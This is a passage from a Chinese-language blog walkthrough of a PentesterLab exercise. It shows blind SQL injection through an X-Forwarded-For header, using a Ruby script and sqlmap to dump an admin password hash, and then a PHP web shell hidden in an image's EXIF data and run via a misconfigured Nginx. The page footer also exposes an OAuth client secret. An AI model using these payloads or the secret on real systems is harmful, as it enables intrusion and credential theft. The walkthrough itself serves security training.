<span class="params">|bit|</span></span><br><span class="line">      <span class="comment"># using the new variable</span></span><br><span class="line">      sql = <span class="string">"select ascii(substring((<span class="subst">#&#123;newinj&#125;</span>),<span class="subst">#&#123;i&#125;</span>,1))&amp;<span class="subst">#&#123;<span class="number">2</span>**bit&#125;</span>"</span></span><br><span class="line">    [...]</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  index+=<span class="number">1</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>
+
+<p>当脚本开始循环，你可以杀死它移动到下一个请求。  </p>
+<p>你可以修改行数在开始运行之前来改善这个脚本。  </p>
+<p>现在我们知道了如何检索多行，我们可以使用脚本来转储：  </p>
+<ul>
+<li>表的列表：<strong>SELECT table_name FROM information_schema.tables</strong>  </li>
+<li>列的列表：<strong>SELECT column_name FROM information_schema.columns</strong>  </li>
+</ul>
+<p>最终，只通过修改载荷来获取信息。</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">inj = <span class="string">"select concat(login,':'password) from users "</span></span><br><span class="line">[...]</span><br></pre></td></tr></table></figure>
+
+<p>我们可以获取登录密码：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">%</span><span class="bash"> ruby exploit.rb</span></span><br><span class="line">a</span><br><span class="line">ad</span><br><span class="line">adm</span><br><span class="line">admi</span><br><span class="line">admin</span><br><span class="line">admin:</span><br><span class="line">admin:8</span><br><span class="line">admin:8e</span><br><span class="line">admin:8ef</span><br><span class="line">admin:8efe</span><br><span class="line">admin:8efe3</span><br><span class="line">admin:8efe31</span><br><span class="line">[...]</span><br><span class="line">admin:8efe310f9ab3efeae8d410a8e0166eb2</span><br></pre></td></tr></table></figure>
+
+<p>现在你已经知道了如何手工利用，接下来我们看一下如何使用SQLMap来做到相同的效果。</p>
+<h1 id="使用SQLMap进行注入"><a href="#使用SQLMap进行注入" class="headerlink" title="使用SQLMap进行注入"></a>使用SQLMap进行注入</h1><p>你也可以使用SQLMap来利用这个漏洞。语法是有点棘手，你需要告诉sqlmap在注入点使用 *。这可以通过以下命令：  </p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> python sqlmap.py -u <span class="string">"http://vulnerable/"</span> --headers=<span class="string">"X-Forwarded-For: *"</span> --banner</span></span><br></pre></td></tr></table></figure>
+
+<p>测试不同的SQL注入方法之后，SQLMap返回如下旗标：  </p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">sqlmap identified the following injection points with a total of 109 HTTP(s) requests:</span><br><span class="line">---</span><br><span class="line">Place: (custom) HEADER</span><br><span class="line">Parameter: X-Forwarded-For #1*</span><br><span class="line">    Type: AND/OR time-based blind</span><br><span class="line">    Title: MySQL &gt; 5.0.11 AND time-based blind</span><br><span class="line">    Payload: ' AND SLEEP(5) AND \'tYCW\'=\'tYCW</span><br><span class="line">[...]</span><br><span class="line">[14:14:18] [INFO] adjusting time delay to 1 second due to good response times</span><br><span class="line">5.1.66-0+squeeze1</span><br><span class="line">web application technology: PHP 5.3.3, Nginx</span><br><span class="line">back-end DBMS: MySQL 5.0.11</span><br><span class="line">banner:    '5.1.66-0+squeeze1\'</span><br></pre></td></tr></table></figure>
+
+<p>我们现在可以获取想要的信息：  </p>
+<ul>
+<li><strong>–dbs</strong> 获取数据库列表。  </li>
+</ul>
+<p>如下：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">%</span><span class="bash"> python sqlmap.py -u <span class="string">"http://vulnerable/"</span> --headers=<span class="string">"X-Forwarded-For: *"</span> --dbs</span></span><br><span class="line">available databases [2]:</span><br><span class="line">[*] information_schema</span><br><span class="line">[*] photoblog</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>-D photoblog –tables</strong>获取表的列表。  </li>
+</ul>
+<p>如下：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">%</span><span class="bash"> python sqlmap.py -u <span class="string">"http://vulnerable/"</span> --headers=<span class="string">"X-Forwarded-For: *"</span> -D photoblog --tables</span></span><br><span class="line">Database: photoblog</span><br><span class="line">[4 tables]</span><br><span class="line">+------------+</span><br><span class="line">| categories |</span><br><span class="line">| pictures   |</span><br><span class="line">| stats      |</span><br><span class="line">| users      |</span><br><span class="line">+------------+</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>-D photoblog -T users –columns</strong>获取列的列表。</li>
+</ul>
+<p>如下：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">%</span><span class="bash"> python sqlmap.py -u <span class="string">"http://vulnerable/"</span> --headers=<span class="string">"X-Forwarded-For: *"</span> -D photoblog -T users --columns</span></span><br><span class="line">Database: photoblog</span><br><span class="line">Table: users</span><br><span class="line">[3 columns]</span><br><span class="line">+----------+-------------+</span><br><span class="line">| Column   | Type        |</span><br><span class="line">+----------+-------------+</span><br><span class="line">| id       | mediu       |</span><br><span class="line">| login    | varchar(50) |</span><br><span class="line">| password | varchar(50) |</span><br><span class="line">+----------+-------------+</span><br></pre></td></tr></table></figure>
+
+<p>使用选项<code>--batch</code>告诉SQLMap使用默认行为，避免用户数据。</p>
+<p>最后，你可以转储表 <strong>users</strong> （SQLMap将允许你自动破解密码）用以下命令：  </p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">%</span><span class="bash"> python sqlmap.py -u <span class="string">"http://vulnerable/"</span> --headers=<span class="string">"X-Forwarded-For: *"</span> -D photoblog -T users --dump --batch</span></span><br><span class="line">Database: photoblog</span><br><span class="line">Table: users</span><br><span class="line">[1 entry]</span><br><span class="line">+----+-------+---------------------------------------------+</span><br><span class="line">| id | login | password                                    |</span><br><span class="line">+----+-------+---------------------------------------------+</span><br><span class="line">| 1  | admin | 8efe310f9ab3efeae8d410a8e0166eb2 (P4ssw0rd) |</span><br><span class="line">+----+-------+---------------------------------------------+</span><br></pre></td></tr></table></figure>
+
+<p>你也可以使用 <strong>–dump-all</strong> 如果你想得到所有的数据库内容（可能很慢）。你也可以使用 <strong>–exclude-sysdbs</strong> 避免转储系统数据库/表而只检索那些默认不存在的。</p>
+<h1 id="访问管理页面和代码执行"><a href="#访问管理页面和代码执行" class="headerlink" title="访问管理页面和代码执行"></a>访问管理页面和代码执行</h1><p>进入管理界面的第一步是破解你获取到的密码。除非你已经用SQLMap破解了它，你可以使用这个练习的第一个版本，按照提供的步骤。否则，你可以使用谷歌来破解它。  </p>
+<h2 id="上传WebShell并且执行代码"><a href="#上传WebShell并且执行代码" class="headerlink" title="上传WebShell并且执行代码"></a>上传WebShell并且执行代码</h2><p>当你遇到一个上传功能，下面的步骤可以遵循的：  </p>
+<ul>
+<li>确保文件上传在web根目录（所以你可以访问它并且得到它的解析）。  </li>
+<li>确保代码检查的文件扩展名，它不能绕过。  </li>
+<li>确保代码检查的内容类型，它不能绕过。  </li>
+</ul>
+<p>通过使用一个合法的图像（<strong>.png</strong> , <strong>.jpg</strong> 或 <strong>.gif</strong> 文件），我们可以看到，文件会在网站根目录上传，被改名为基于当前时间，该文件的扩展名仍然保持。  </p>
+<p>如果你想上传一个PHP扩展名文件，不同于<strong>.png</strong> , <strong>.jpg</strong> 或 <strong>.gif</strong> 。文件会被拒绝。看起来不能绕过。</p>
+<p>如果你想上传一个文件以正确的扩展名但没有合适的内容（如文本文件命名为 <strong>test.jpg</strong> ），文件也被拒绝。</p>
+<p>最后，如果你想上传一个文件以正确的扩展，正确的内容但有一个小的内容修改（用 <strong>vi</strong> 添加额外的话），该文件也被拒绝了。</p>
+<p>唯一的可能是上传一个有效的文件去执行代码。我们还注意到，该文件没有被PHP代码调整大小。</p>
+<p>2010年， <strong>80sec.com</strong> 发布了nginx文件类型错误解析漏洞<a href="http://www.80sec.com/nginx-securit.html" target="_blank" rel="noopener" title="common issue in Nginx servers&#39; configuration">http://www.80sec.com/nginx-securit.html</a>（中文）。这个问题也在Neal Poole in 2011<a href="https://nealpoole.com/blog/2011/04/setting-up-php-fastcgi-and-nginx-dont-trust-the-tutorials-check-your-configuration/" target="_blank" rel="noopener" title="Neal Poole in 2011">https://nealpoole.com/blog/2011/04/setting-up-php-fastcgi-and-nginx-dont-trust-the-tutorials-check-your-configuration/</a>进行过详细的说明。</p>
+<p>基本上，如果Nginx/PHP配置不正确，当有人访问URL：<a href="http://vulnerable/admin/uploads/hacker.png/x.php" target="_blank" rel="noopener" title="http://vulnerable/admin/uploads/hacker.png/x.php">http://vulnerable/admin/uploads/hacker.png/x.php</a>时，文件 <strong>hack.png</strong> 会被解析成PHP代码。</p>
+<p>我们可以利用这个错误配置获得代码执行在服务器上仅仅通过上传恶意的图像。然而，在我们测试之前，该文件必须是一个有效的图像。我们需要找到一种方法将PHP代码注入到图像的同时保持一个有效的文件。</p>
+<p>一个简单的方法是把我们的有效载荷内作为一个评论注入到图像的EXIF区域。这可以通过使用工具 <strong>exiftool</strong> 做到。<br><code>gd</code>库被很多PHP应用用来删除EXIF数据，当图像被调整大小。幸运的是，这里的情况不是这样的，。它仍然是值得测试的因为很多人（特别是照片）想要保留这些信息，即使图像可以调整大小，仍然决定离开<code>gd</code>到<code>ImageMagick</code>。</p>
+<p>首先，我们需要创建载荷（<strong>shell.php</strong>）：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> system($_GET[<span class="string">'c'</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>然后我们可以使用 <strong>exiftool</strong> 把我们的载荷注入到图像中：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">%</span><span class="bash"> exiftool <span class="string">"-comment&lt;=shell.php"</span> malicious.png</span></span><br></pre></td></tr></table></figure>
+
+<p>最后，我们需要确保一切都是好的（在调试浪费时间之前）：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">%</span><span class="bash"> strings malicious.png | grep system</span></span><br><span class="line">&lt;?php system($_GET['c']); ?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>我们现在可以上传自己的图像。一旦上传，我们需要通过检查网页的源文件来检索路径。我们可以通过添加“PHP扩展”和我们要运行的命令来访问图像。例如，如果上传的文件被命名为 <strong>1369904954.png</strong> ,我们可以访问<a href="http://vulnerable/admin/uploads/1369904954.png/c.php?c=uname%20-a" target="_blank" rel="noopener" title="http://vulnerable/admin/uploads/1369904954.png/c.php?c=uname%20-a">http://vulnerable/admin/uploads/1369904954.png/c.php?c=uname%20-a</a>来执行代码。</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/old_images/master/2015032009.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这个练习将教你如何手动检测和利用SQL盲注获得一个网站管理页面。一旦进入“信任区”，更多可用的功能将产生更多的漏洞。这个练习是一个很好的例子有多小技巧可以影响Web服务器的性能并且允许攻击者控制它。</p>
+
+        </div>
+
+        <blockquote class="post-copyright">
+    
+    <div class="content">
+        
+<span class="post-time">
+    最終更新：<time datetime="2019-08-29T06:29:50.630Z" itemprop="dateUpdated">2019-08-29 14:29:50</time>
+</span><br>
+
+
+        
+        水平不济整日被虐这也不会那也得学,脑子太蠢天天垫底这看不懂那学不会
+        
+    </div>
+    
+    <footer>
+        <a href="https://darkwing.moe">
+            <img src="/img/avatar.jpg" alt="暗羽">
+            暗羽
+        </a>
+    </footer>
+</blockquote>
+
+        
+<div class="page-reward">
+    <a id="rewardBtn" href="javascript:;" class="page-reward-btn waves-effect waves-circle waves-light">赏</a>
+</div>
+
+
+
+        <div class="post-footer">
+            
+	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Pentesterlab/" rel="tag">Pentesterlab</a></li></ul>
+
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://darkwing.moe/2015/03/20/From-SQL-Injection-to-Shell-II/&title=《From SQL Injection to Shell II》 — 喵喵喵喵&pic=https://darkwing.moe/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://darkwing.moe/2015/03/20/From-SQL-Injection-to-Shell-II/&title=《From SQL Injection to Shell II》 — 喵喵喵喵&source=安全研究，懒，基本不自己写" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://darkwing.moe/2015/03/20/From-SQL-Injection-to-Shell-II/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《From SQL Injection to Shell II》 — 喵喵喵喵&url=https://darkwing.moe/2015/03/20/From-SQL-Injection-to-Shell-II/&via=https://darkwing.moe" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://darkwing.moe/2015/03/20/From-SQL-Injection-to-Shell-II/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="waves-block waves-effect prev">
+      <a href="/2015/03/26/PHP-Include-And-Post-Exploitation/" id="post-prev" class="post-nav-link">
+        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
+        <h4 class="title">PHP Include And Post Exploitation</h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/2015/03/16/From-SQL-Injection-to-Shell/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">From SQL Injection to Shell</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<section class="comments" id="comments">
+    <div id="gitalk-container"></div>
+    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+    <script>
+        var id = location.pathname
+        if (location.pathname.length > 50) {
+          id = location.pathname.replace(/\/\d+\/\d+\/\d+\//, '').replace('/', '').substring(0, 50)
+        }
+        const gitalk = new Gitalk({
+          clientID: 'd35074a248599729ad26',
+          clientSecret: 'd208d5902ab831ba7294f942046bcd8da954f9ff',
+          repo: 'BlogComments',
+          owner: 'zjicmDarkWing',
+          admin: ['zjicmDarkWing'],
+          id: id,      // Ensure uniqueness and length less than 50
+          title: document.title.split('|')[0],
+          distractionFreeMode: false  // Facebook-like distraction free mode
+        })
+
+        gitalk.render('gitalk-container')
+    </script>
+</section>
+
+
+
+
+</article>
+
+<div id="reward" class="page-modal reward-lay">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <h3 class="reward-title">
+        <i class="icon icon-quote-left"></i>
+        谢谢大爷~
+        <i class="icon icon-quote-right"></i>
+    </h3>
+    <div class="reward-content">
+        
+        <div class="reward-code">
+            <img id="rewardCode" src="/img/wechat.png" alt="打赏二维码">
+        </div>
+        
+        <label class="reward-toggle">
+            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
+                data-wechat="/img/wechat.png" data-alipay="/img/alipay.jpeg">
+            <div class="reward-toggle-ctrol">
+                <span class="reward-toggle-item wechat">微信</span>
+                <span class="reward-toggle-label"></span>
+                <span class="reward-toggle-item alipay">支付宝</span>
+            </div>
+        </label>
+        
+    </div>
+</div>
+
+
+
+</div>
+
+        <footer class="footer">
+    <div class="top">
+        
+<p>
+    <span id="busuanzi_container_site_uv" style='display:none'>
+        站点总访客数：<span id="busuanzi_value_site_uv"></span>
+    </span>
+    <span id="busuanzi_container_site_pv" style='display:none'>
+        站点总访问量：<span id="busuanzi_value_site_pv"></span>
+    </span>
+</p>
+
+
+        <p>
+            
+                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
+            
+            <span>このブログの内容物は<a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.ja" target="_blank">クリエイティブ・コモンズ 表示 - 非営利 - 継承 4.0 国際ライセンスの下に提供されています</a></span>
+        </p>
+    </div>
+    <div class="bottom">
+        <p><span>暗羽 &copy; 2014 - 2020</span>
+            <span>
+                
+                Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
+            </span>
+        </p>
+    </div>
+</footer>
+
+    </main>
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://darkwing.moe/2015/03/20/From-SQL-Injection-to-Shell-II/&title=《From SQL Injection to Shell II》 — 喵喵喵喵&pic=https://darkwing.moe/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://darkwing.moe/2015/03/20/From-SQL-Injection-to-Shell-II/&title=《From SQL Injection to Shell II》 — 喵喵喵喵&source=安全研究，懒，基本不自己写" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://darkwing.moe/2015/03/20/From-SQL-Injection-to-Shell-II/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《From SQL Injection to Shell II》 — 喵喵喵喵&url=https://darkwing.moe/2015/03/20/From-SQL-Injection-to-Shell-II/&via=https://darkwing.moe" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://darkwing.moe/2015/03/20/From-SQL-Injection-to-Shell-II/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAN4AAADeCAAAAAB3DOFrAAACtklEQVR42u3aQW7jMBAEwPz/015kr15L3UMyERbFU2DLkooByEEPv77i8fo73j+5/vz92/e7fbomv9uGgYeHhzd69U/j+prknp9ICbJ9n3/cBw8PD+8YL1++rx+Tr9Lt09tf4eHh4T2Bl4+kXE5Kczw8PLz/j9cWuMlEJBsPHh4e3hN4+RKfM1au/4WsBQ8PDy/mtQ2wJ/x9sL+Hh4eHt9BVb0vk/NhBuy0NAxE8PDy8A7y2obU3ur0+zpWHuTdPx8PDw9vKy8PZlSg2OTpwjZxNEx4eHt45Xr5YXxfQ+TS109o2zPDw8PDO8ZJAoW0ytc2wlWmK/gF4eHh4B3grwet6aT47XpBEFXh4eHgneLuW2jbCaANcPDw8vOfw2pC0DVv3Nsl2hb94eHh4K7y8OJ4FCushRR6FRPseHh4e3jKvfaE2bG1L3va8WLHx4OHh4W3i5c34fANYaf+3UcXNhoGHh4d3jJeXv0mgMJum6PhUe6wBDw8P7wBv9rN2OtrjXO2G0bbr8PDw8NZ5eUSblMXtVrE+rTdX4uHh4W3lJeXvrHE1OzqQl9TJpoKHh4f3W7w8um1HHh9EmGTHw8PDw1vmtY2lVzDaiWuj3nqy8PDw8I7x2nJ2Zblvy+sNhTUeHh7eJt7sVdroYVdxnMciSzONh4eHF9er+Wsly3f7Ku1xgfZ98PDw8HbxVg5UtUV2u3mslOl4eHh453jtwj07AtXefxbm3vwWDw8PbxPvVY4ZJp/plcOpN1kLHh4e3iZeu+zmscXswcl2sv4UPDw8vHVefogq2SRmQW0eDdflPh4eHt4xXrvEz0j5xjOLIfDw8PCeycsjhjycnV1Zt77w8PDwfpw3iwxWvm2fjoeHh/eTvLZcbovv2bS2n9RdPjw8PLwRb1cDLD9odWJLON7fw8PDw/sefwAlxAMnDVNdUAAAAABJRU5ErkJggg==" alt="微信分享二维码">
+</div>
+
+
+
+
+    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: true };
+
+
+</script>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>
+
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item">
+    <a href="{path}" class="waves-block waves-effect">
+        <div class="title ellipsis" title="{title}">{title}</div>
+        <div class="flex-row flex-middle">
+            <div class="tags ellipsis">
+                {tags}
+            </div>
+            <time class="flex-col time">{date}</time>
+        </div>
+    </a>
+</li>
+</template>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>
+
+
+
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+<script>
+(function() {
+    var OriginTitile = document.title, titleTime;
+    document.addEventListener('visibilitychange', function() {
+        if (document.hidden) {
+            document.title = '死鬼去哪里了！';
+            clearTimeout(titleTime);
+        } else {
+            document.title = '(つェ⊂)咦!又好了!';
+            titleTime = setTimeout(function() {
+                document.title = OriginTitile;
+            },2000);
+        }
+    });
+})();
+</script>
+
+
+
+</body>
+</html>
